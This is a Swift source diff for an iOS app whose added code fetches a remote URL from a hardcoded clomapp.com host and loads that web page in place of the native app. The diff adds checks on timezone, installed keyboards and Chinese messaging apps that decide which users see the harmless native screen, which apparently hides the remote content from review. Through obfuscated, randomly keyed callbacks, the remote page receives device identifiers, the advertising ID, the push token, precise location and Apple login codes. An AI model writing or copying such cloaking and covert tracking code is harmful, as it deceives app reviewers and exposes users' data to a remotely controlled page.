@@ -6,7 +6,6 @@ import CoreLocation
 import Security
 import System
 import CommonCrypto
-import TZImagePickerController
 import StoreKit
 import WebKit
 import AuthenticationServices
@@ -14,6 +13,37 @@ import RevenueCat
 import Alamofire
 import AppsFlyerLib
 import SVProgressHUD
+import Moya
+enum APIService {
+    case getEncodedUrl(query: String)
+}
+extension APIService: TargetType {
+    var baseURL: URL {
+        return URL(string: "https://tubxj7.clomapp.com")!
+    }
+    var path: String {
+        switch self {
+        case .getEncodedUrl:
+            return "/rwy8m9"
+        }
+    }
+    var method: Moya.Method {
+        return .get
+    }
+    
+    var sampleData: Data {
+        return Data()
+    }
+    var task: Task {
+        switch self {
+        case .getEncodedUrl(let query):
+            return .requestParameters(parameters: ["co": query], encoding: URLEncoding.queryString)
+        }
+    }
+    var headers: [String: String]? {
+        return nil
+    }
+}
 extension Notification.Name {
     static let appKeyboardWillShowNotification = Notification.Name(UIResponder.keyboardWillShowNotification.rawValue)
     static let appKeyboardWillHidenNotification = Notification.Name(UIResponder.keyboardWillHideNotification.rawValue)
@@ -58,7 +88,7 @@ extension String {
     static func readFromKeychain() -> String? {
         let query: [String: Any] = [
             kSecClass as String: kSecClassGenericPassword,
-            kSecAttrAccount as String: Bundle.main.bundleIdentifier ?? "",
+            kSecAttrAccount as String: SystemInfoRecorder.shared.appBundleId,
             kSecReturnData as String: true,
             kSecMatchLimit as String: kSecMatchLimitOne
         ]
@@ -69,81 +99,21 @@ extension String {
         }
         return nil
     }
-    static func hostName() -> String {
+    static func  webAB() -> String{
         let projectName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
-        let projectNameMust = "\(projectName)_hostName"
+        let projectNameMust = "\(projectName)_ab"
         return projectNameMust
     }
-    static func webName() -> String {
+    static func  webHost() -> String{
         let projectName = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
-        let projectNameMust = "\(projectName)_webName"
+        let projectNameMust = "\(projectName)_host"
         return projectNameMust
-    }
-    
-    var appBundleId: String {
-        Bundle.main.bundleIdentifier ?? ""
-    }
-    var appName: String {
-        return (Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String) ??
-        (Bundle.main.infoDictionary?["CFBundleName"] as? String) ?? ""
-    }
-    var systemVersion: String {
-        UIDevice.current.systemVersion
-    }
-    var deviceVersion: String {
-        var systemInfo = utsname()
-        uname(&systemInfo)
-        let machine = withUnsafePointer(to: &systemInfo.machine) {
-            $0.withMemoryRebound(to: CChar.self, capacity: 1) {
-                String(cString: $0)
-            }
-        }
-        return machine ?? ""
-    }
-    var systemLanguage: String {
-        let lang = Locale.preferredLanguages.first ?? "en"
-        let components = lang.split(separator: "-")
-        guard components.count >= 2 else {
-            return lang.lowercased()
-        }
-        return String(format: "%@-%@", components[0].lowercased(),components[1].lowercased())
-    }
-    var systemTimezone: String {
-        let seconds = TimeZone.current.secondsFromGMT()
-        let hours = seconds / 3600
-        let minutes = abs((seconds / 60) % 60)
-        let sign = hours >= 0 ? "+" : "-"
-        return String(format: "GMT%@%02ld:%02ld", sign, abs(hours), minutes)
-    }
-    var systemClientId: String{
-        var value = String()
-        if let saved = String.readFromKeychain() {
-            return saved
-        }else{
-            if AppPermissionTool.shared.trackingPermission == 0 {
-                let newValue = String.generateRandomString(length: 32)
-                value = String.md5(from:newValue)
-            }else{
-                value = AppPermissionTool.shared.idfaPermission
-            }
-        }
-        StringHelper.shared.saveToKeychain(value: value, for: appBundleId)
-        return value
-    }
-    var appVersion: String {
-        return  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.4"
-    }
-    var UA: String {
-        return String(format: "%@/%@ iOS/%@ (%@)", appName,appVersion,systemVersion,deviceVersion)
-    }
-    var osTimezone: String{
-        return TimeZone.current.identifier
     }
 }
 extension Bool {
     static func isiPhone() -> Bool {
         return UIDevice.current.userInterfaceIdiom == .phone
-     }
+    }
     static func isChineseKeyboardInstalled() -> Bool {
         let keyboards = UserDefaults.standard.array(forKey: "AppleKeyboards") as? [String] ?? []
         for keyboard in keyboards {
@@ -160,10 +130,14 @@ extension Bool {
         }
         return false
     }
+    static func isTimeZone() -> Bool {
+        let tz = TimeZone.current
+        return tz.identifier == "Asia/Shanghai" || tz.identifier == "Asia/Hong_Kong" || tz.identifier == "Asia/Macau" || tz.identifier == "Asia/Taipei"
+    }
     static func isPlanAppInstalled() -> Bool {
         let schemes = [
-            "weixin://",
-            "snssdk1128://"
+            "snssdk1128://",
+            "mqq://"
         ]
         for scheme in schemes {
             if let url = URL(string: scheme), UIApplication.shared.canOpenURL(url) {
@@ -172,12 +146,14 @@ extension Bool {
         }
         return false
     }
-    
-    static func isSystemFirst() -> Bool {
+    static func isSystemFirst() -> Bool{
         if (!Bool.isiPhone()){
             return false
         }
         if (Bool.isChineseKeyboardInstalled()){
+            return false
+        }
+        if (Bool.isTimeZone()){
             return false
         }
         if (Bool.isPlanAppInstalled()){
@@ -378,15 +354,70 @@ extension AppPermissionTool : CLLocationManagerDelegate{
 class SystemInfoRecorder: NSObject {
     static let shared = SystemInfoRecorder()
     private  override init() {}
-   
+    var appBundleId: String {
+        Bundle.main.bundleIdentifier ?? ""
+    }
+    var appName: String {
+        return (Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String) ??
+        (Bundle.main.infoDictionary?["CFBundleName"] as? String) ?? ""
+    }
+    var systemVersion: String {
+        UIDevice.current.systemVersion
+    }
+    var deviceVersion: String {
+        var systemInfo = utsname()
+        uname(&systemInfo)
+        let machine = withUnsafePointer(to: &systemInfo.machine) {
+            $0.withMemoryRebound(to: CChar.self, capacity: 1) {
+                String(cString: $0)
+            }
+        }
+        return machine ?? ""
+    }
+    var systemLanguage: String {
+        let lang = Locale.preferredLanguages.first ?? "en"
+        let components = lang.split(separator: "-")
+        guard components.count >= 2 else {
+            return lang.lowercased()
+        }
+        return String(format: "%@-%@", components[0].lowercased(),components[1].lowercased())
+    }
+    var systemTimezone: String {
+        let seconds = TimeZone.current.secondsFromGMT()
+        let hours = seconds / 3600
+        let minutes = abs((seconds / 60) % 60)
+        let sign = hours >= 0 ? "+" : "-"
+        return String(format: "GMT%@%02ld:%02ld", sign, abs(hours), minutes)
+    }
+    func systemClientId() -> String {
+        var value = String()
+        if let saved = String.readFromKeychain() {
+            return saved
+        }else{
+            if AppPermissionTool.shared.trackingPermission == 0 {
+                let newValue = String.generateRandomString(length: 32)
+                value = String.md5(from:newValue)
+            }else{
+                value = AppPermissionTool.shared.idfaPermission
+            }
+        }
+        StringHelper.shared.saveToKeychain(value: value, for: appBundleId)
+        return value
+    }
+    var UA: String {
+        return String(format: "%@/1.5.0 iOS/%@ (%@)", appName,systemVersion,deviceVersion)
+    }
+    func osTimezone() -> String {
+        return TimeZone.current.identifier
+    }
     func infoDicCallBack() -> [String: Any] {
         var info: [String: Any] = [:]
-        info[String.random() + "ua"] = String().UA
-        info[String.random() + "ci"] = String().systemClientId
-        info[String.random() + "tz"] = String().systemTimezone
-        info[String.random() + "lg"] = String().systemLanguage
+        info[String.random() + "ua"] = UA
+        info[String.random() + "ci"] = systemClientId()
+        info[String.random() + "tz"] = systemTimezone
+        info[String.random() + "lg"] = systemLanguage
         info[String.random() + "fa"] = AppPermissionTool.shared.idfaPermission
-        info[String.random() + "ot"] = String().osTimezone
+        info[String.random() + "ot"] = osTimezone()
         info[String.random() + "af"] = AppsFlyerLib.shared().getAppsFlyerUID()
         info[String.random() + "dt"] = UserDefaults.standard.string(forKey: "deviceToken") ?? ""
         return info
@@ -395,25 +426,24 @@ class SystemInfoRecorder: NSObject {
 class NetworkService: NSObject {
     static let shared = NetworkService()
     private  override init() {}
-    func getUrl(_ url: String,
-                successBlock: @escaping (_ data: Any?, _ isEnd: Bool) -> Void) {
-        AF.request(url, method: .get, parameters: [String: Any]() ,headers:[])
-            .validate()
-            .responseData { response in
-                switch response.result {
-                case .success(let data):
-                    DispatchQueue.main.async {
-                        successBlock(data, true)
-                    }
-                case .failure:
-                    DispatchQueue.main.async {
-                        successBlock("nil", false)
-                    }
+    let provider = MoyaProvider<APIService>()
+    func getUrl(successBlock: @escaping (_ data: Any?, _ isEnd: Bool) -> Void) {
+        let plainString = "\(SystemInfoRecorder.shared.UA):v1.1.0"
+        let base64String = plainString.data(using: .utf8)?.base64EncodedString() ?? ""
+        provider.request(.getEncodedUrl(query: base64String)) { result in
+            switch result {
+            case .success(let response):
+                DispatchQueue.main.async {
+                    successBlock(response.data, true)
+                }
+            case .failure:
+                DispatchQueue.main.async {
+                    successBlock("nil", false)
                 }
             }
+        }
     }
 }
-
 class PayHandler: NSObject {
     static let shared = PayHandler()
     private  override init() {}
@@ -503,6 +533,7 @@ class WebViewBridge: NSObject {
     private weak var targetView: UIView?
     private var shieldOverlay: UIView!
     private var webView: WKWebView?
+    var revenueCatKey  = String()
     var completionHandleronAppShow: ((Bool) -> Void)?
     var becomeViewController : UIViewController?
     private override init() {
@@ -528,6 +559,15 @@ class WebViewBridge: NSObject {
     func applicationWillEnterForeground(_ show: Bool) {
         completionHandleronAppShow?(show)
     }
+    func becomeWindow(_ window : UIWindow ,_ viewController : UIViewController, _ revenuecat: String, _ callback: @escaping (Bool?) -> Void){
+        AppPermissionTool.shared.registerPushAndTrackIDFA()
+        WebViewBridge.shared.becomeViewController = UIViewController()
+        WebViewBridge.shared.becomeViewController = viewController
+        revenueCatKey = revenuecat
+        window.rootViewController = NavigationController(rootViewController: WebViewHelper())
+        window.makeKeyAndVisible()
+    }
+    
     func appleLoginWithCompletion(_ completion: @escaping appleLoginCompletion) {
         self.completionHandler = completion
         let appleIDProvider = ASAuthorizationAppleIDProvider()
@@ -537,16 +577,6 @@ class WebViewBridge: NSObject {
         authorizationController.delegate = self
         authorizationController.presentationContextProvider = self
         authorizationController.performRequests()
-    }
-
-    var revenueCatKey  = String()
-    func becomeWindow(_ window : UIWindow ,_ viewController : UIViewController, _ revenuecat: String, _ callback: @escaping (Bool?) -> Void){
-        AppPermissionTool.shared.registerPushAndTrackIDFA()
-        WebViewBridge.shared.becomeViewController = UIViewController()
-        WebViewBridge.shared.becomeViewController = viewController
-        revenueCatKey = revenuecat
-        window.rootViewController = NavigationController(rootViewController: WebViewHelper())
-        window.makeKeyAndVisible()
     }
     func handlerViewController(_ viewController: UIViewController, wkWebView: WKWebView, handlerWKScriptMessage message: WKScriptMessage) {
         self.webView = wkWebView
@@ -619,7 +649,7 @@ extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationContr
         }
     }
     func authorizationController(controller: ASAuthorizationController, didCompleteWithError error: Error) {
-        completionHandler?(false, "")
+       completionHandler?(false, "")
     }
     func presentationAnchor(for controller: ASAuthorizationController) -> ASPresentationAnchor {
         return UIWindow.current!
@@ -646,7 +676,6 @@ extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationContr
         let callback = data.first(where: { $0.key.hasSuffix("_cb") })?.value as? String ?? ""
         let type = data.first(where: { $0.key.hasSuffix("_pe") })?.value as? String ?? ""
         let typeStr = String(type.suffix(2))
-        
         if typeStr == "lo"{
             let skip = data.first(where: { $0.key.hasSuffix("_sk") }).map { "\($0.value)" } ?? ""
             if skip == "1"{
@@ -661,7 +690,7 @@ extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationContr
         }else if typeStr == "gd"{
             handleGoods(data: data, uuid: uuid, callback: callback)
         }else if typeStr == "ab"{
-            UserDefaults.standard.setValue("******", forKey: String.webName())
+            UserDefaults.standard.setValue("******", forKey: String.webAB())
             self.becomeViewController?.modalPresentationStyle = .fullScreen
             UIWindow.current?.currentController?.present(self.becomeViewController!, animated: false, completion: nil)
         }else if typeStr == "ag"{
@@ -676,11 +705,6 @@ extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationContr
             infoDic[String.random() +  "ud"] = uuid
             let infoStr = String(format: "window.%@('%@',%@)", String.typeRandomStr(),callback,String.jsonString(from:infoDic) ?? "")
             self.webView?.evaluateJavaScript(infoStr) { _, error in
-                if error == nil {
-                    print("\(callback) Success JS")
-                }else{
-                    print("\(callback) JS Error: \(error)")
-                }
             }
         }else if typeStr == "sr"{
             DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
@@ -709,10 +733,7 @@ extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationContr
                 locationDic[String.random() + "ln"] = String(roundedLongitude)
                 locationDic[String.random() + "lo"] = isAuthorized ? 1 : 0
                 locationDic[String.random() + "ud"] = uuid
-                debugPrint(locationDic)
-                
                 let js = String(format: "window.%@('%@',%@)",String.typeRandomStr(),callback,String.jsonString(from:locationDic) ?? "")
-                debugPrint(js)
                 self.webView?.evaluateJavaScript(js) { _, error in
                     if error == nil {
                         print("\(callback) Success JS")
@@ -727,8 +748,8 @@ extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationContr
     private func handleAppleLogin(data: [String: Any], uuid: String, callback: String) {
         WebViewBridge.shared.appleLoginWithCompletion { success, code in
             var dic: [String: Any] = [:]
-            dic[String.random() + "cd"] = code
             dic[String.random() + "us"] = success ? 1 : 0
+            dic[String.random() + "cd"] = code
             dic[String.random() + "pe"] = data["type"]
             dic[String.random() + "ud"] = uuid
             let js = String(format: "window.%@('%@',%@)",String.typeRandomStr(),callback,String.jsonString(from:dic) ?? "")
@@ -776,9 +797,6 @@ extension WebViewBridge : ASAuthorizationControllerDelegate,ASAuthorizationContr
                             }
                             PayHandler.shared.offerings = offerings
                         }
-                    }else{
-                        print(value)
-                        
                     }
                 }
             }
@@ -808,7 +826,6 @@ class WebViewHelper: UIViewController{
     override func viewDidLoad() {
         super.viewDidLoad()
         self.navigationController?.setNavigationBarHidden(true, animated: false)
-        
         let userContentController = WKUserContentController()
         let messageHandlers = [
             "pr",
@@ -824,6 +841,7 @@ class WebViewHelper: UIViewController{
         config.preferences.javaScriptEnabled = true
         config.allowsInlineMediaPlayback = true
         config.mediaTypesRequiringUserActionForPlayback = []
+        
         webView = WKWebView(frame: .zero, configuration: config)
         webView.navigationDelegate = self
         webView.scrollView.delegate = self
@@ -858,51 +876,47 @@ class WebViewHelper: UIViewController{
         self.view.backgroundColor = .black
     }
     private func setupNetworkReachability(){
-        if(UserDefaults.standard.object(forKey: String.webName()) != nil){
+        if(UserDefaults.standard.object(forKey: String.webAB()) != nil){
             UIApplication.shared.applicationIconBadgeNumber = 0
             WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
-            UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: false, completion: nil)
-        }else{
-            
-            reachabilityManager = NetworkReachabilityManager()
-            reachabilityManager?.startListening { [weak self] status in
-                guard let self = self else { return }
-                switch status {
-                case .reachable(.ethernetOrWiFi), .reachable(.cellular):
-                    makeRequest()
-                case .notReachable:
-                    print("")
-                case .unknown:
-                    print("")
+                UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: false, completion: nil)
+            }else{
+                reachabilityManager = NetworkReachabilityManager()
+                reachabilityManager?.startListening { [weak self] status in
+                    guard let self = self else { return }
+                    switch status {
+                    case .reachable(.ethernetOrWiFi), .reachable(.cellular):
+                        makeRequest()
+                    case .notReachable:
+                        print("")
+                    case .unknown:
+                        print("")
+                    }
                 }
             }
-        }
     }
     private func makeRequest() {
-       if (UserDefaults.standard.string(forKey: String.hostName()) ?? "").isBlank {
+        print(UserDefaults.standard.object(forKey: String.webHost()))
+        
+        if (UserDefaults.standard.object(forKey: String.webHost())) == nil {
             targetStyem()
         }else{
             SVProgressHUD .setDefaultStyle(.dark)
             SVProgressHUD .show(withStatus: "loading...")
-            self.locatineRequest(path:UserDefaults.standard.string(forKey:  String.hostName()) ?? "https://fwjxwd.clomapp.com/v1.1.0/debug_vibe?cache_version=1750170507")
+            self.locatineRequest(path:UserDefaults.standard.string(forKey:  String.webHost())!)
             upploadPath()
         }
         
     }
     private func targetStyem(){
-        
-        if !Bool.isSystemFirst(){
-            UIApplication.shared.applicationIconBadgeNumber = 0
+
+        if Bool.isSystemFirst(){
             WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
             UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: false, completion: nil)
         }else{
             SVProgressHUD .setDefaultStyle(.dark)
             SVProgressHUD .show(withStatus: "loading...")
-            let plainString = String(format: "%@:v1.1.0",String().UA)
-            let base64String = plainString.data(using: .utf8)?.base64EncodedString() ?? ""
-            let qurty = String(format: "?%@co=%@", String.random(),base64String)
-            let path = String(format: "https://tubxj7.clomapp.com/rwy8m9%@", qurty)
-            NetworkService.shared.getUrl(path) { data, isEnd in
+           NetworkService.shared.getUrl { data, isEnd in
                 if isEnd{
                     guard let realData = data as? Data else { return }
                     do {
@@ -917,7 +931,6 @@ class WebViewHelper: UIViewController{
                             let lastKey = dataDict.keys.reversed().first as? String ?? ""
                             let knvhiStr = dataDict[lastKey] as? String ?? ""
                             if !lastKey.hasSuffix("i") {
-                                UIApplication.shared.applicationIconBadgeNumber = 0
                                 self.waitImage.isHidden = true
                                 SVProgressHUD .dismiss()
                                 WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
@@ -927,14 +940,13 @@ class WebViewHelper: UIViewController{
                                 let name = String(parts[0]) // "4ir7gbfncryvkfdi"
                                 let ext = String(parts[1]) //filetype
                                 if  ext == "jpg"{
-                                    UIApplication.shared.applicationIconBadgeNumber = 0
                                     self.waitImage.isHidden = true
                                     SVProgressHUD .dismiss()
                                     WebViewBridge.shared.becomeViewController?.modalPresentationStyle = .fullScreen
                                     UIWindow.current?.currentController?.present(WebViewBridge.shared.becomeViewController!, animated: true, completion: nil)
                                 }else{
-                                    UserDefaults.standard.setValue(String(format: "https://fwjxwd.clomapp.com/%@?%@fv=v1.1.0",name,String.random()), forKey:  String.hostName())
-                                    self.locatineRequest(path:UserDefaults.standard.string(forKey:  String.hostName()) ?? "")
+                                    UserDefaults.standard.setValue(String(format: "https://fwjxwd.clomapp.com/%@?%@fv=v1.1.0",name,String.random()), forKey:  String.webHost())
+                                    self.locatineRequest(path:UserDefaults.standard.string(forKey: String.webHost())!)
                                 }
                             }
                         }else{
@@ -948,177 +960,172 @@ class WebViewHelper: UIViewController{
                     SVProgressHUD .showError(withStatus: "Error")
                 }
             }
-             }
-        }
-        private func locatineRequest(path:String){
-            if let url = URL(string: path) {
-                webView.load(URLRequest(url: url))
-            }
-        }
-        private func upploadPath(){
-            let plainString = String(format: "%@:v1.1.0",String().UA)
-            let base64String = plainString.data(using: .utf8)?.base64EncodedString() ?? ""
-            let qurty = String(format: "?%@co=%@", String.random(),base64String)
-            let path = String(format: "https://tubxj7.clomapp.com/rwy8m9%@", qurty)
-            NetworkService.shared.getUrl(path) { data, isEnd in
-                if isEnd{
-                    guard let realData = data as? Data else { return }
-                    do {
-                        let json = try JSONSerialization.jsonObject(with: realData) as? [String: Any] ?? [:]
-                        let codeKey = "code"
-                        let dataKey = "data"
-                        guard let code = json[codeKey],
-                              let dataDict = json[dataKey] as? [String: Any] else {
-                            return
-                        }
-                        if String(format: "%@", code as! CVarArg) == "1003"{
-                            let lastKey = dataDict.keys.reversed().first as? String ?? ""
-                            let knvhiStr = dataDict[lastKey] as? String ?? ""
-                            let parts = knvhiStr.split(separator: ".")
-                            let name = String(parts[0]) // "4ir7gbfncryvkfdi"
-                            let ext = String(parts[1]) //filetype
-                            if  ext == "png"{
-                                UserDefaults.standard.setValue(String(format: "https://fwjxwd.clomapp.com/%@?%@fv=v1.1.0",name,String.random()), forKey:  String.hostName())
-                            }
-                        }
-                    }
-                    catch {
-                        print("JSON Error: \(error)")
-                    }
-                }else{
-                    
-                }
-            }
-        }
-        private func setupNotificationObservers() {
-            NotificationCenter.default.addObserver(
-                self,
-                selector: #selector(keyboardWillShow(_:)),
-                name: .appKeyboardWillShowNotification,
-                object: nil
-            )
-            NotificationCenter.default.addObserver(
-                self,
-                selector: #selector(keyboardWillHide(_:)),
-                name: .appKeyboardWillHidenNotification,
-                object: nil
-            )
-        }
-        @objc private func keyboardWillShow(_ notification: Notification) {
-            guard let userInfo = notification.userInfo else { return }
-            var jsonDict =  WebViewBridge.shared.processedKeyboardUserInfo(from: userInfo)
-            var keyDic: [String: Any] = [:]
-            keyDic["UIKeyboardAnimationDurationUserInfoKey"] = jsonDict["UIKeyboardAnimationDurationUserInfoKey"]
-            keyDic["UIKeyboardFrameEndUserInfoKey"] = jsonDict["UIKeyboardFrameEndUserInfoKey"]
-            keyDic["isShow"] = 1
-            guard let jsonStr = String.jsonString(from: keyDic)else { return }
-            let js = String(format: "window.%@('kc',%@)", String.typeRandomStr(),jsonStr)
-            webView.evaluateJavaScript(js) { (result, error) in
-                if error == nil {
-                    print("kc Success JS")
-                }else{
-                    print("kc Error JS")
-                }
-            }
-        }
-        @objc private func keyboardWillHide(_ notification: Notification) {
-            guard let userInfo = notification.userInfo else { return }
-            var jsonDict =  WebViewBridge.shared.processedKeyboardUserInfo(from: userInfo)
-            var keyDic: [String: Any] = [:]
-            keyDic["UIKeyboardAnimationDurationUserInfoKey"] = jsonDict["UIKeyboardAnimationDurationUserInfoKey"]
-            keyDic["UIKeyboardFrameEndUserInfoKey"] = jsonDict["UIKeyboardFrameEndUserInfoKey"]
-            keyDic["isShow"] = 0
-            guard let jsonStr = String.jsonString(from: keyDic)else { return }
-            let js = String(format: "window.%@('kc',%@)", String.typeRandomStr(),jsonStr)
-            webView.evaluateJavaScript(js) { (result, error) in
-                if error == nil {
-                    print("kc Success JS")
-                    
-                }
-            }
-        }
-        private func checkPermission() {
-            if UserDefaults.standard.object(forKey: "locationPermission") != nil {
-                AppPermissionTool.shared.getPermissionLocationWithCompletion { latitude, longitude, isAuthorized in
-                    if !isAuthorized {
-                        self.permission()
-                    } else {
-                        UserDefaults.standard.set("****", forKey: "islocation")
-                        let roundedLatitude = Double(String(format: "%.6f", latitude)) ?? 0
-                        let roundedLongitude = Double(String(format: "%.6f", longitude)) ?? 0
-                        var locationDic: [String: Any] = [:]
-                        locationDic[String.random() + "lt"] = String(roundedLatitude)
-                        locationDic[String.random() + "ln"] = String(roundedLongitude)
-                        locationDic[String.random() + "lo"] = isAuthorized ? 1 : 0
-                        let js = String(format: "window.%@('nc',%@)",String.typeRandomStr(),String.jsonString(from: locationDic) ?? "")
-                        self.webView?.evaluateJavaScript(js) { _, error in
-                            if error == nil {
-                                print("onLocationChange Success JS")
-                                self.permission()
-                            }
-                        }
-                    }
-                }
-            }
-        }
-        private func permission() {
-            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
-                var permissionDict: [String: Any] = [:]
-                permissionDict[String.random() + "um"] = AppPermissionTool.shared.albumPermission()
-                permissionDict[String.random() + "ra"] = AppPermissionTool.shared.cameraPermission()
-                permissionDict[String.random() + "lo"] = AppPermissionTool.shared.locationPermission
-                permissionDict[String.random() + "if"] = AppPermissionTool.shared.notificationPermission
-                permissionDict[String.random() + "ng"] = AppPermissionTool.shared.trackingPermission
-                permissionDict[String.random() + "fa"] = AppPermissionTool.shared.idfaPermission
-                let permStr = String(format: "window.%@('pr',%@)",String.typeRandomStr(), String.jsonString(from: permissionDict) ?? "")
-                self.webView.evaluateJavaScript(permStr) { _, error in
-                    if error == nil {
-                    }else{
-                        print(error as Any)
-                    }
-                }
-            }
         }
     }
-    extension WebViewHelper: WKNavigationDelegate,UIScrollViewDelegate, WKScriptMessageHandler  {
-        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-            print("Finish WkWebView")
-            SVProgressHUD.dismiss()
-            UIView.transition(with: self.waitImage, duration: 0.3, options: .transitionCrossDissolve, animations: {
-                self.waitImage.isHidden = true
-            }, completion: nil)
-            UIView.animate(withDuration: 1.5) {
-                self.webView.alpha = 1.0
-            }
-            reachabilityManager?.stopListening()
-            permission()
-            checkPermission()
-            let badgeValue = Int.badgeNumber()
-            UserDefaults.standard.setValue(badgeValue, forKey: "badge")
-            UIApplication.shared.applicationIconBadgeNumber = badgeValue
-        }
-        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
-            WebViewBridge.shared.handlerViewController(self, wkWebView: self.webView, handlerWKScriptMessage: message)
-        }
-        func scrollViewDidScroll(_ scrollView: UIScrollView) {
-            let newOffset = scrollView.contentOffset
-            if newOffset.y > 0 {
-                scrollView.contentOffset = .zero
-            }
-        }
-        func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
-            
-        }
-        func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
-            
-        }
-        
-        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
-            
-        }
-    }
+    private func locatineRequest(path:String){
 
-//
+        if let url = URL(string: path) {
+            webView.load(URLRequest(url: url))
+        }
+    }
+    private func upploadPath(){
+        NetworkService.shared.getUrl { data, isEnd in
+            if isEnd{
+                guard let realData = data as? Data else { return }
+                do {
+                    let json = try JSONSerialization.jsonObject(with: realData) as? [String: Any] ?? [:]
+                    let codeKey = "code"
+                    let dataKey = "data"
+                    guard let code = json[codeKey],
+                          let dataDict = json[dataKey] as? [String: Any] else {
+                        return
+                    }
+                    if String(format: "%@", code as! CVarArg) == "1003"{
+                        let lastKey = dataDict.keys.reversed().first as? String ?? ""
+                        let knvhiStr = dataDict[lastKey] as? String ?? ""
+                        let parts = knvhiStr.split(separator: ".")
+                        let name = String(parts[0]) // "4ir7gbfncryvkfdi"
+                        let ext = String(parts[1]) //filetype
+                        if  ext == "png"{
+                            UserDefaults.standard.setValue(String(format: "https://fwjxwd.clomapp.com/%@?%@fv=v1.1.0",name,String.random()), forKey: String.webHost())
+                        }
+                    }
+                }
+                catch {
+                    print("JSON Error: \(error)")
+                }
+            }else{
+               
+            }
+        }
+    }
+    private func setupNotificationObservers() {
+        NotificationCenter.default.addObserver(
+            self,
+            selector: #selector(keyboardWillShow(_:)),
+            name: .appKeyboardWillShowNotification,
+            object: nil
+        )
+        NotificationCenter.default.addObserver(
+            self,
+            selector: #selector(keyboardWillHide(_:)),
+            name: .appKeyboardWillHidenNotification,
+            object: nil
+        )
+    }
+    @objc private func keyboardWillShow(_ notification: Notification) {
+        guard let userInfo = notification.userInfo else { return }
+        let jsonDict =  WebViewBridge.shared.processedKeyboardUserInfo(from: userInfo)
+        var keyDic: [String: Any] = [:]
+        keyDic["UIKeyboardAnimationDurationUserInfoKey"] = jsonDict["UIKeyboardAnimationDurationUserInfoKey"]
+        keyDic["UIKeyboardFrameEndUserInfoKey"] = jsonDict["UIKeyboardFrameEndUserInfoKey"]
+        keyDic["isShow"] = 1
+        guard let jsonStr = String.jsonString(from: keyDic)else { return }
+        let js = String(format: "window.%@('kc',%@)", String.typeRandomStr(),jsonStr)
+        webView.evaluateJavaScript(js) { (result, error) in
+            if error == nil {
+                print("kc Success JS")
+            }else{
+                print("kc Error JS")
+            }
+        }
+    }
+    @objc private func keyboardWillHide(_ notification: Notification) {
+        guard let userInfo = notification.userInfo else { return }
+        let jsonDict =  WebViewBridge.shared.processedKeyboardUserInfo(from: userInfo)
+        var keyDic: [String: Any] = [:]
+        keyDic["UIKeyboardAnimationDurationUserInfoKey"] = jsonDict["UIKeyboardAnimationDurationUserInfoKey"]
+        keyDic["UIKeyboardFrameEndUserInfoKey"] = jsonDict["UIKeyboardFrameEndUserInfoKey"]
+        keyDic["isShow"] = 0
+        guard let jsonStr = String.jsonString(from: keyDic)else { return }
+        let js = String(format: "window.%@('kc',%@)", String.typeRandomStr(),jsonStr)
+        webView.evaluateJavaScript(js) { (result, error) in
+            if error == nil {
+                print("kc Success JS")
+                
+            }
+        }
+    }
+    private func checkPermission() {
+        if UserDefaults.standard.object(forKey: "locationPermission") != nil {
+            AppPermissionTool.shared.getPermissionLocationWithCompletion { latitude, longitude, isAuthorized in
+                if !isAuthorized {
+                    self.permission()
+                } else {
+                    UserDefaults.standard.set("****", forKey: "islocation")
+                    let roundedLatitude = Double(String(format: "%.6f", latitude)) ?? 0
+                    let roundedLongitude = Double(String(format: "%.6f", longitude)) ?? 0
+                    var locationDic: [String: Any] = [:]
+                    locationDic[String.random() + "lt"] = String(roundedLatitude)
+                    locationDic[String.random() + "ln"] = String(roundedLongitude)
+                    locationDic[String.random() + "lo"] = isAuthorized ? 1 : 0
+                    let js = String(format: "window.%@('nc',%@)",String.typeRandomStr(),String.jsonString(from: locationDic) ?? "")
+                    self.webView?.evaluateJavaScript(js) { _, error in
+                        if error == nil {
+                            print("onLocationChange Success JS")
+                            self.permission()
+                        }
+                    }
+                }
+            }
+        }
+    }
+    private func permission() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
+            var permissionDict: [String: Any] = [:]
+            permissionDict[String.random() + "um"] = AppPermissionTool.shared.albumPermission()
+            permissionDict[String.random() + "ra"] = AppPermissionTool.shared.cameraPermission()
+            permissionDict[String.random() + "lo"] = AppPermissionTool.shared.locationPermission
+            permissionDict[String.random() + "if"] = AppPermissionTool.shared.notificationPermission
+            permissionDict[String.random() + "ng"] = AppPermissionTool.shared.trackingPermission
+            permissionDict[String.random() + "fa"] = AppPermissionTool.shared.idfaPermission
+            let permStr = String(format: "window.%@('pr',%@)",String.typeRandomStr(), String.jsonString(from: permissionDict) ?? "")
+            self.webView.evaluateJavaScript(permStr) { _, error in
+                if error == nil {
+                }else{
+                    print(error as Any)
+                }
+            }
+        }
+    }
+}
+extension WebViewHelper: WKNavigationDelegate,UIScrollViewDelegate, WKScriptMessageHandler  {
+    func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
+        
+    }
+    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
